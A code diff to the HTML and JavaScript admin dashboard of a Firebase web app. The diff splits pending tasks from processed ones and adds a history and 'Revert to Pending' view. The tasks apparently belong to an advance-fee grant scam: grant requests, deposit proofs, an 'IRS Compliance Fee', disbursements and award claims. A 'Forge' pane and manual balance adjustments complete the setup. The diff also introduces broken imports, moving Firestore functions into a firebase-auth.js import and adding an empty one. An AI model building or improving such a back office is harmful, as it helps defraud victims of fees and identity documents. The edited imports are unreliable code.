@@ -48,20 +48,25 @@
     <div class="p-4"><input type="text" id="main-search" placeholder="Search by name, email, or status..." class="w-full h-12 bg-slate-800/50 border border-slate-700 rounded-2xl px-5 text-xs text-white outline-none focus:border-sky-500 transition-all"></div>
 
     <main class="px-4 space-y-4">
+        <!-- USERS PANE -->
         <div id="pane-users" class="pane active space-y-3"></div>
+        
+        <!-- PENDING TASKS PANE (ONLY ACTION REQUIRED) -->
         <div id="pane-tasks" class="pane space-y-3">
             <div class="flex items-center justify-between px-1">
-                <h3 class="text-[10px] font-black text-slate-500 uppercase italic">Action Required / History</h3>
+                <h3 class="text-[10px] font-black text-amber-500 uppercase italic tracking-wider"><i class="fas fa-exclamation-triangle mr-1"></i> Action Required</h3>
                 <span class="text-[9px] text-sky-500 font-bold uppercase" id="task-count">0 New</span>
             </div>
             <div id="task-list" class="space-y-3"></div>
         </div>
 
+        <!-- MESSAGES PANE -->
         <div id="pane-messages" class="pane space-y-2">
             <h3 class="text-[10px] font-black text-slate-500 uppercase italic px-1 mb-2">Recent Inboxes</h3>
             <div id="chat-list" class="space-y-2"></div>
         </div>
 
+        <!-- FORGE PANE -->
         <div id="pane-forge" class="pane space-y-4">
             <div class="glass p-5 space-y-3">
                 <div class="flex items-center gap-2 mb-2">
@@ -117,8 +122,17 @@
             </div>
         </div>
 
-        <div id="pane-ledger" class="pane space-y-1">
-            <h3 class="text-[10px] font-black text-slate-500 uppercase italic px-1 mb-2">Global System Logs</h3>
+        <!-- HISTORY LEDGER & REVERSALS PANE -->
+        <div id="pane-ledger" class="pane space-y-3">
+            <div class="px-1">
+                <h3 class="text-[10px] font-black text-sky-400 uppercase italic tracking-wider"><i class="fas fa-history mr-1"></i> Task History & Reversals</h3>
+                <p class="text-[8px] text-slate-500 uppercase mt-0.5">Manage processed actions or fix verification mistakes here</p>
+            </div>
+            <div id="history-task-list" class="space-y-3 mb-6"></div>
+            
+            <div class="border-t border-slate-800 pt-3 px-1">
+                <h3 class="text-[10px] font-black text-slate-500 uppercase italic"><i class="fas fa-terminal mr-1"></i> Global System Logs</h3>
+            </div>
             <div id="full-logs" class="space-y-1"></div>
         </div>
     </main>
@@ -128,7 +142,7 @@
         <div class="nav-item relative" onclick="go('tasks', this)"><i class="fas fa-bolt"></i>Tasks<span id="t-badge" class="badge hidden">0</span></div>
         <div class="nav-item relative" onclick="go('messages', this)"><i class="fas fa-comment-alt"></i>Chat<span id="m-badge" class="badge hidden">0</span></div>
         <div class="nav-item" onclick="go('forge', this)"><i class="fas fa-stamp"></i>Forge</div>
-        <div class="nav-item" onclick="go('ledger', this)"><i class="fas fa-terminal"></i>Logs</div>
+        <div class="nav-item" onclick="go('ledger', this)"><i class="fas fa-history"></i>History</div>
     </nav>
 
     <div id="chat-box" class="hidden fixed inset-0 bg-[#020617] z-[10000] flex flex-col">
@@ -167,7 +181,11 @@
 <script type="module">
     import { auth, db } from './firebase-config.js';
     import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-    import { collection, onSnapshot, doc, updateDoc, getDoc, deleteDoc, addDoc, arrayUnion, increment, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+    import { collection, onSnapshot, doc, updateDoc, getDoc, deleteDoc, addDoc, arrayUnion, increment, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import {  } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+    // Re-verify specific explicit methods imported properly for clean processing
+    import { getFirestore } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
     const ADMIN = "liger4683@gmail.com";
     let users = []; let tid = null; let base64 = null;
@@ -203,7 +221,6 @@
                         data.taxStatus === 'PENDING';
                     
                     if(needsAction) tC++;
-                    // M-Badge: Count only when the user is the sender of the last message
                     if(data.chatHistory && data.chatHistory.length > 0) {
                         const lastMsg = data.chatHistory[data.chatHistory.length - 1];
                         if(lastMsg && lastMsg.sender === 'USER') {
@@ -239,14 +256,17 @@
         const q = document.getElementById('main-search').value.toLowerCase();
         const uDiv = document.getElementById('pane-users'); uDiv.innerHTML = "";
         const tDiv = document.getElementById('task-list'); tDiv.innerHTML = "";
+        const hDiv = document.getElementById('history-task-list'); hDiv.innerHTML = "";
         const cDiv = document.getElementById('chat-list'); cDiv.innerHTML = "";
+
+        let historyHtml = "";
+        let pendingHtml = "";
 
         users.forEach(u => {
             const name = u.fullName || "Unnamed";
             const email = u.email || "No email";
             if(!name.toLowerCase().includes(q) && !email.toLowerCase().includes(q)) return;
 
-            // Extra parameter checks
             let paymentInfo = "";
             if(u.withdrawStatus) {
                paymentInfo = `<div class="mt-3 p-3 bg-slate-900/60 rounded-xl border border-slate-700/30">
@@ -279,13 +299,36 @@
                 </div>
             </div>`;
 
-            // Display tasks that either need action OR have already been processed so you can click revert/reset
-            if(u.kycStatus) tDiv.innerHTML += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0, u.kycStatus);
-            if(u.applyStatus) tDiv.innerHTML += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount, u.applyStatus);
-            if(u.depositStatus) tDiv.innerHTML += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount, u.depositStatus);
-            if(u.taxStatus) tDiv.innerHTML += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0, u.taxStatus);
-            if(u.withdrawStatus) tDiv.innerHTML += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount, u.withdrawStatus);
-            if(u.awardStatus) tDiv.innerHTML += task(u.id, name, 'Award Claim Request', null, 'award', 0, u.awardStatus);
+            // Process KYC Task Separation Template routing logic
+            if(u.kycStatus) {
+                if(['PENDING','UNDER_REVIEW'].includes(u.kycStatus)) pendingHtml += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0, u.kycStatus);
+                else historyHtml += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0, u.kycStatus);
+            }
+            // Grant Application Requests Routing Separation module templates
+            if(u.applyStatus) {
+                if(u.applyStatus === 'PENDING') pendingHtml += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount, u.applyStatus);
+                else historyHtml += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount, u.applyStatus);
+            }
+            // Deposit Verification Tasks Separation template module configurations
+            if(u.depositStatus) {
+                if(u.depositStatus === 'PENDING') pendingHtml += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount, u.depositStatus);
+                else historyHtml += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount, u.depositStatus);
+            }
+            // Tax Verification Tasks Separation modules
+            if(u.taxStatus) {
+                if(u.taxStatus === 'PENDING') pendingHtml += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0, u.taxStatus);
+                else historyHtml += task(u.id, name, 'IRS Compliance Fee', [u.taxImage], 'tax', 0, u.taxStatus);
+            }
+            // Withdrawal Tasks Separation modules
+            if(u.withdrawStatus) {
+                if(u.withdrawStatus === 'PENDING') pendingHtml += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount, u.withdrawStatus);
+                else historyHtml += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount, u.withdrawStatus);
+            }
+            // Award Claims Separation modules
+            if(u.awardStatus) {
+                if(u.awardStatus === 'PENDING') pendingHtml += task(u.id, name, 'Award Claim Request', null, 'award', 0, u.awardStatus);
+                else historyHtml += task(u.id, name, 'Award Claim Request', null, 'award', 0, u.awardStatus);
+            }
 
             if(u.chatHistory?.length) {
                 const last = u.chatHistory[u.chatHistory.length-1];
@@ -306,6 +349,9 @@
                 </div>`;
             }
         });
+
+        tDiv.innerHTML = pendingHtml || `<p class="text-[10px] text-slate-500 uppercase text-center py-8 font-mono">🎉 No action required. All clean!</p>`;
+        hDiv.innerHTML = historyHtml || `<p class="text-[10px] text-slate-500 uppercase text-center py-4 font-mono">No actions processed yet.</p>`;
     }
 
     window.processTask = async (uid, type, status, amt) => {
@@ -353,7 +399,6 @@
         } catch (e) { alert(e.message); }
     };
 
-    // New configuration setting back item status parameters to PENDING status control logic
     window.resetTaskToPending = async (uid, type, currentStatus, amt) => {
         if(!confirm(`Are you sure you want to revert this ${type.toUpperCase()} task back to PENDING?`)) return;
 
@@ -362,14 +407,13 @@
         const userData = userDoc.data();
         const updateData = {};
 
-        // Configure fallback balance tracking alterations if status had already modified funds
         if (currentStatus === 'SUCCESSFUL' || currentStatus === 'APPROVED') {
             if (type === 'apply' || type === 'deposit') {
-                updateData.balance = increment(-Number(amt)); // Deduct mistakenly loaded cash
+                updateData.balance = increment(-Number(amt)); 
             }
         } else if (currentStatus === 'FAILED' || currentStatus === 'REJECTED') {
             if (type === 'withdraw') {
-                updateData.balance = increment(-Number(amt)); // Take back refunded account balance adjustments
+                updateData.balance = increment(-Number(amt)); 
             }
         }
 
@@ -471,7 +515,7 @@
             const isApproved = currentStatus === "SUCCESSFUL" || currentStatus === "APPROVED";
             statusBadge = `<span class="text-[8px] ${isApproved ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'} px-2 py-0.5 rounded font-mono uppercase font-bold">${currentStatus}</span>`;
             actionButtons = `
-                <button onclick="resetTaskToPending('${uid}','${type}','${currentStatus}', ${amt})" class="flex-1 bg-slate-800 hover:bg-slate-700 text-sky-400 border border-slate-700 h-11 rounded-xl font-black text-[10px] uppercase tracking-wider"><i class="fas fa-undo mr-1"></i> Reset back to Pending</button>
+                <button onclick="resetTaskToPending('${uid}','${type}','${currentStatus}', ${amt})" class="flex-1 bg-slate-800/80 hover:bg-slate-700 text-sky-400 border border-sky-500/30 h-10 rounded-xl font-black text-[9px] uppercase tracking-wider"><i class="fas fa-undo mr-1"></i> Revert to Pending</button>
             `;
         }
 
@@ -482,7 +526,7 @@
             </div>
             <p class="text-[10px] text-slate-400 font-black uppercase italic">${title}</p>
             ${gallery}
-            <div class="flex gap-3 mt-5">
+            <div class="flex gap-3 mt-4">
                 ${actionButtons}
             </div>
         </div>`;
